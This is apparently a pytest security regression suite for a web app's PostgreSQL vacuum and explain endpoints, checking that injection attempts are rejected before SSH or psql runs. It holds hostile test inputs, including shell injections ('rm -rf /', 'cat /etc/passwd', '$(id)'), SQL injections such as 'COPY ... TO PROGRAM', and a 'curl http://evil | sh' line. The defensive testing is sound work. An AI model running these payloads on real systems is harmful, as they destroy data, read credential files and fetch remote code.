"""
Security regression tests for PostgreSQL command injection fixes.

Verifies that the database allowlist validation in pg_vacuum and pg_explain
rejects shell metacharacters and injection payloads before they reach SSH commands.

Also covers GHSA-p3xx-rpm2-g5f8: pg_explain must reject any `query` that is
not a single, read-only-shaped SQL statement (rather than shelling out the
entire caller-supplied text to `psql -f` unconstrained), and must run any
accepted statement inside a rolled-back, read-only transaction.
"""
import json
import shlex
from unittest.mock import patch

import pytest

from models import Guest, GuestService, db
from routes.services import _explain_transaction_sql, _prepare_explain_sql


@pytest.fixture()
def pg_service(app):
    """Create a PostgreSQL GuestService and return its ID. Cleaned up after the test."""
    with app.app_context():
        guest = Guest(name="_sec-pg-test", guest_type="ct", enabled=True)
        db.session.add(guest)
        db.session.flush()
        svc = GuestService(
            guest_id=guest.id,
            service_name="postgresql",
            unit_name="postgresql.service",
            port=5432,
        )
        db.session.add(svc)
        db.session.commit()
        svc_id = svc.id
        guest_id = guest.id

    yield svc_id, guest_id

    with app.app_context():
        GuestService.query.filter_by(guest_id=guest_id).delete()
        Guest.query.filter_by(id=guest_id).delete()
        db.session.commit()


_INJECTION_PAYLOADS = [
    "postgres'; rm -rf /",
    "testdb; id",
    "testdb`id`",
    "testdb$(id)",
    "testdb|cat /etc/passwd",
    "testdb&id",
    "../../etc/passwd",
    "a" * 64,            # exceeds 63-char limit
    "",                  # empty — caught by the earlier check, but confirm
]

_VALID_DB_NAMES = [
    "postgres",
    "my_app_db",
    "App123",
    "a",
    "a" * 63,            # exactly 63 chars — should be accepted
]


class TestPgVacuumDatabaseValidation:
    """pg_vacuum must reject database names that contain shell metacharacters."""

    def test_injection_payloads_rejected(self, app, auth_client, pg_service):
        svc_id, _ = pg_service
        for payload in _INJECTION_PAYLOADS:
            resp = auth_client.post(
                f"/services/{svc_id}/pg/vacuum",
                data=json.dumps({"database": payload, "analyze": False}),
                content_type="application/json",
            )
            data = resp.get_json()
            assert resp.status_code == 400, (
                f"Expected 400 for database={payload!r}, got {resp.status_code}: {data}"
            )
            assert data.get("ok") is False

    def test_valid_names_pass_validation(self, app, auth_client, pg_service):
        """Valid database names should pass validation (even if SSH fails — we only care about the 400)."""
        svc_id, _ = pg_service
        for name in _VALID_DB_NAMES:
            resp = auth_client.post(
                f"/services/{svc_id}/pg/vacuum",
                data=json.dumps({"database": name, "analyze": False}),
                content_type="application/json",
            )
            data = resp.get_json()
            # The SSH call will fail (no real host), but it must NOT be a 400 from validation
            assert resp.status_code != 400 or data.get("message") != "Invalid database name.", (
                f"Valid database name {name!r} was incorrectly rejected"
            )


class TestPgExplainDatabaseValidation:
    """pg_explain must reject database names that contain shell metacharacters."""

    def test_injection_payloads_rejected(self, app, auth_client, pg_service):
        svc_id, _ = pg_service
        for payload in _INJECTION_PAYLOADS:
            resp = auth_client.post(
                f"/services/{svc_id}/pg/explain",
                data=json.dumps({"database": payload, "query": "SELECT 1"}),
                content_type="application/json",
            )
            data = resp.get_json()
            assert resp.status_code == 400, (
                f"Expected 400 for database={payload!r}, got {resp.status_code}: {data}"
            )
            assert data.get("ok") is False

    def test_valid_names_pass_validation(self, app, auth_client, pg_service):
        svc_id, _ = pg_service
        for name in _VALID_DB_NAMES:
            resp = auth_client.post(
                f"/services/{svc_id}/pg/explain",
                data=json.dumps({"database": name, "query": "SELECT 1"}),
                content_type="application/json",
            )
            data = resp.get_json()
            assert resp.status_code != 400 or data.get("message") != "Invalid database name.", (
                f"Valid database name {name!r} was incorrectly rejected"
            )


class TestPgExplainQueryShellQuoting:
    """
    Verify shlex.quote() is used for the query: queries containing shell
    metacharacters should be accepted (not rejected), but the resulting
    shlex.quote() output must contain only safe single-quoted content.
    """

    def test_shlex_quote_output_is_safe(self):
        """Unit-level check: shlex.quote wraps dangerous content in single quotes.

        Inside POSIX single-quoted strings, ALL metacharacters (backticks, $(),
        semicolons, pipes) are treated as literal text by the shell — no expansion
        occurs. shlex.quote() always produces a single-quoted string (handling
        embedded single quotes via the '"'"' pattern).
        """
        import shlex

        dangerous_queries = [
            "SELECT 1; `id`",
            "SELECT $(id)",
            "SELECT 1; rm -rf /",
            "SELECT 'hello'",
        ]
        for q in dangerous_queries:
            quoted = shlex.quote(f"EXPLAIN {q}")
            # shlex.quote must always wrap output in single quotes so the shell
            # treats ALL metacharacters as literal characters.
            assert quoted.startswith("'"), f"shlex.quote did not single-quote: {quoted}"
            assert quoted.endswith("'"), f"shlex.quote did not single-quote: {quoted}"


# ---------------------------------------------------------------------------
# GHSA-p3xx-rpm2-g5f8: `query` must be a single, read-only-shaped statement,
# and the psql script actually executed must be a rolled-back, read-only
# transaction with a statement timeout.
# ---------------------------------------------------------------------------

class TestPrepareExplainSqlUnit:
    """Unit tests for the `_prepare_explain_sql` validation helper."""

    _HOSTILE_QUERIES = [
        "1; DROP TABLE x; --",
        "SELECT 1; SELECT 2",
        "SELECT 1; DROP TABLE x",
        "COPY (SELECT 1) TO PROGRAM 'id'",
        "SELECT 1 -- drop everything",
        "SELECT 1 /* comment */",
        "SELECT 1\n\\gexec",
        "\\! id",
        "",
        "   ",
        "a" * 20_001,
    ]

    @pytest.mark.parametrize("query", _HOSTILE_QUERIES)
    def test_hostile_queries_rejected(self, query):
        with pytest.raises(ValueError):
            _prepare_explain_sql(query, analyze=False)
        with pytest.raises(ValueError):
            _prepare_explain_sql(query, analyze=True)

    def test_valid_select_accepted(self):
        assert _prepare_explain_sql("SELECT 1", analyze=False) == "SELECT 1"
        assert _prepare_explain_sql("SELECT 1", analyze=True) == "SELECT 1"

    def test_trailing_semicolon_is_stripped(self):
        assert _prepare_explain_sql("SELECT 1;", analyze=False) == "SELECT 1"

    def test_double_trailing_semicolon_rejected(self):
        with pytest.raises(ValueError):
            _prepare_explain_sql("SELECT 1;;", analyze=False)

    def test_with_values_table_accepted(self):
        assert _prepare_explain_sql("WITH t AS (SELECT 1) SELECT * FROM t", analyze=False)
        assert _prepare_explain_sql("VALUES (1), (2)", analyze=False)
        assert _prepare_explain_sql("TABLE users", analyze=False)

    def test_leading_parenthesis_accepted(self):
        assert _prepare_explain_sql("(SELECT 1)", analyze=False) == "(SELECT 1)"

    def test_write_statement_accepted_only_for_plain_explain(self):
        # Plain EXPLAIN only plans a write statement — it never executes it,
        # and the transaction it runs inside is read-only and always rolled
        # back regardless — so UPDATE/DELETE/INSERT are permitted here.
        assert _prepare_explain_sql("DELETE FROM users WHERE id = 1", analyze=False)
        assert _prepare_explain_sql("UPDATE users SET x = 1", analyze=False)
        assert _prepare_explain_sql("INSERT INTO users (id) VALUES (1)", analyze=False)

    def test_write_statement_rejected_for_analyze(self):
        # EXPLAIN ANALYZE *executes* the statement, so writes are never
        # permitted here regardless of the surrounding read-only transaction.
        for stmt in ("DELETE FROM users WHERE id = 1", "UPDATE users SET x = 1", "INSERT INTO users (id) VALUES (1)"):
            with pytest.raises(ValueError):
                _prepare_explain_sql(stmt, analyze=True)

    def test_case_insensitive_start_keyword(self):
        assert _prepare_explain_sql("select 1", analyze=False) == "select 1"
        assert _prepare_explain_sql("With t as (select 1) select * from t", analyze=False)


class TestExplainTransactionSql:
    def test_wraps_statement_in_readonly_rolled_back_transaction(self):
        sql = _explain_transaction_sql("EXPLAIN", "SELECT 1")
        assert "BEGIN;" in sql
        assert "SET TRANSACTION READ ONLY;" in sql
        assert "SET LOCAL statement_timeout" in sql
        assert "EXPLAIN SELECT 1;" in sql
        assert "ROLLBACK;" in sql
        # Order matters: READ ONLY and the timeout must be set before the
        # EXPLAIN runs, and ROLLBACK must come after it.
        assert sql.index("SET TRANSACTION READ ONLY") < sql.index("EXPLAIN SELECT 1")
        assert sql.index("EXPLAIN SELECT 1") < sql.index("ROLLBACK")


class TestPgExplainEndpointStatementGuard:
    """End-to-end: the /pg/explain route must reject hostile `query` values
    before any SSH command runs, and must send an accepted statement to psql
    wrapped in a rolled-back, read-only transaction.
    """

    @patch("core.scanner._execute_command")
    def test_hostile_queries_rejected_before_execution(self, mock_exec, auth_client, pg_service):
        svc_id, _ = pg_service
        for query in TestPrepareExplainSqlUnit._HOSTILE_QUERIES:
            if not query.strip():
                continue  # empty/whitespace-only query is caught by the earlier "required" check
            mock_exec.reset_mock()
            resp = auth_client.post(
                f"/services/{svc_id}/pg/explain",
                data=json.dumps({"database": "mydb", "query": query}),
                content_type="application/json",
            )
            data = resp.get_json()
            assert resp.status_code == 400, f"Expected 400 for query={query!r}, got {resp.status_code}: {data}"
            assert data.get("ok") is False
            mock_exec.assert_not_called()

    @patch("core.scanner._execute_command")
    def test_valid_select_produces_readonly_rolledback_transaction(self, mock_exec, auth_client, pg_service):
        svc_id, _ = pg_service
        mock_exec.return_value = ("", None)

        resp = auth_client.post(
            f"/services/{svc_id}/pg/explain",
            data=json.dumps({"database": "mydb", "query": "SELECT 1"}),
            content_type="application/json",
        )
        assert resp.status_code == 200, resp.get_json()
        assert mock_exec.call_count == 2

        write_command = mock_exec.call_args_list[0].args[1]
        assert write_command.startswith("printf %s ")
        # shlex.split respects the shlex.quote()-wrapped SQL body as a single
        # token, giving back the literal (unquoted) SQL text psql will see.
        tokens = shlex.split(write_command)
        assert tokens[:2] == ["printf", "%s"]
        assert tokens[3] == ">"
        body = tokens[2]
        assert "SET TRANSACTION READ ONLY" in body
        assert "SET LOCAL statement_timeout" in body
        assert "ROLLBACK" in body
        assert "EXPLAIN SELECT 1" in body

        run_command = mock_exec.call_args_list[1].args[1]
        assert "-v ON_ERROR_STOP=1" in run_command
        assert "-X" in run_command

    @patch("core.scanner._execute_command")
    def test_explain_analyze_delete_style_query_rejected(self, mock_exec, auth_client, pg_service):
        """A write statement submitted to /pg/explain is only ever *planned*
        (plain EXPLAIN, never ANALYZE) inside a read-only transaction, so it
        is accepted here — but this pins that pg_analyze_plan (which forces
        EXPLAIN ANALYZE and therefore *executes* the statement) must reject
        the same input; see tests/test_pg_plan_analyzer.py.
        """
        svc_id, _ = pg_service
        mock_exec.return_value = ("", None)
        resp = auth_client.post(
            f"/services/{svc_id}/pg/explain",
            data=json.dumps({"database": "mydb", "query": "DELETE FROM users WHERE id = 1"}),
            content_type="application/json",
        )
        assert resp.status_code == 200, resp.get_json()


class TestPgHardeningIsWired:
    """Tripwire for the regression that re-opened GHSA-3cjx-7w8r-jwxv and
    GHSA-p3xx-rpm2-g5f8 after they were fixed.

    PRs #145 and #146 merged on 2026-09-08; the squash merge of PR #147 twenty
    minutes later was cut from a stale base and silently reverted both, deleting
    core/pg_identifiers.py and the tests that covered it. v0.2.0 was tagged from
    that state. These assertions look at the *wiring* (imports and the exact
    sink expressions), so a future merge that drops any of it fails here even if
    the behavioural tests are deleted alongside the code again.
    """

    def test_shared_validator_module_exists(self):
        from core import pg_identifiers

        assert pg_identifiers.validate_pg_db_name("app_db")
        assert not pg_identifiers.validate_pg_db_name("x; curl http://evil | sh")
        assert not pg_identifiers.validate_pg_db_name("")

    def test_scanner_and_services_share_the_validator(self):
        import core.scanner as scanner
        import routes.services as services
        from core.pg_identifiers import PG_DB_NAME_RE, validate_pg_db_name

        assert scanner.validate_pg_db_name is validate_pg_db_name
        assert services._PG_DB_NAME_RE is PG_DB_NAME_RE

    def test_scanner_psql_sinks_use_validated_quoted_names(self):
        import inspect

        import core.scanner as scanner

        src = inspect.getsource(scanner._stats_postgresql)
        assert "validate_pg_db_name(" in src
        assert "psql -d {_safe_table_db}" in src
        assert "psql -d {_safe_ss_db}" in src
        assert "psql -d {_table_target_db}" not in src
        assert "psql -d {_ss_db}" not in src

    def test_explain_routes_use_statement_guard_and_readonly_transaction(self):
        import inspect

        import routes.services as services

        for view in (services.pg_explain, services.pg_analyze_plan):
            src = inspect.getsource(view)
            assert "_prepare_explain_sql(" in src, view.__name__
            assert "_explain_transaction_sql(" in src, view.__name__
            assert "ON_ERROR_STOP=1" in src, view.__name__


class TestExplainRejectionMessagesAreConstants:
    """The 400 body for a rejected query comes from _EXPLAIN_REJECT_MESSAGES,
    never from exception text (CodeQL py/stack-trace-exposure on the routes)."""

    def test_helper_raises_reason_coded_exception(self):
        from routes.services import _EXPLAIN_REJECT_MESSAGES, ExplainSqlRejected

        with pytest.raises(ExplainSqlRejected) as info:
            _prepare_explain_sql("SELECT 1; DROP TABLE x", analyze=False)
        assert info.value.reason == "multi_statement"
        assert str(info.value) == _EXPLAIN_REJECT_MESSAGES["multi_statement"]

    @patch("core.scanner._execute_command")
    def test_route_message_is_table_constant(self, mock_exec, auth_client, pg_service):
        from routes.services import _EXPLAIN_REJECT_MESSAGES

        svc_id, _ = pg_service
        for path, query, reason in (
            ("pg/explain", "SELECT 1; DROP TABLE x", "multi_statement"),
            ("pg/explain", "SELECT 1 -- hidden", "comment"),
            ("pg/analyze-plan", "DELETE FROM users", "bad_start_analyze"),
            ("pg/analyze-plan", r"\! id", "meta_command"),
        ):
            resp = auth_client.post(
                f"/services/{svc_id}/{path}",
                data=json.dumps({"database": "mydb", "query": query}),
                content_type="application/json",
            )
            assert resp.status_code == 400, (path, query)
            assert resp.get_json()["message"] == _EXPLAIN_REJECT_MESSAGES[reason]
        mock_exec.assert_not_called()
